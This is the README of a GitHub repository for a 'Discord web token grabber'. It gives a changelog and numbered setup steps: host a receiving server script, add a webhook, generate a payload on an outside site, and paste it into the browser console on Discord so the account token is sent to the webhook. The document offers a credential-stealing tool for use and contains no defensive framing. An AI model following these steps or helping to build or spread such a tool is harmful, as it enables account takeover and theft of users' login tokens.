## Logs

**July 14, 2023**: Updated server. Rewrote [`server.py`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py) in Node.js as [`server.js`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.js) for those who prefer using Node.js instead of Python.

## Platforms

Windows, macOS, Linux, and any other operating system that has a web browser capable of running JavaScript (including Samsung Smart Fridge).

## Setup

1. Upload the [`server.py`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py) script to a hosting service such as [Replit](https://replit.com/) or any other hosting service of your choice.
2. Replace the text [`YOUR WEBHOOK`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py#L6) in the [`server.py`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py) script with the webhook you want the token to be sent to.
3. Start the hosting service and copy the URL of the [`server.py`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py) script.
4. Go to [this website](https://web-stealer.yuvi5000.repl.co/), select the payload, and enter the URL of the [`server.py`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py) script.
5. Copy the generated payload and paste it into the browser console while Discord is open in the tab. The token will be sent to the specified webhook.
